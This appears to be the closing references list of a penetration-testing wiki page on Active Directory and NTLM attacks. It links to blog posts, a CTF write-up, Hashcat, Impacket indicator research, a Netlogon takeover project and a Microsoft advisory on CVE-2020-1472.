- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
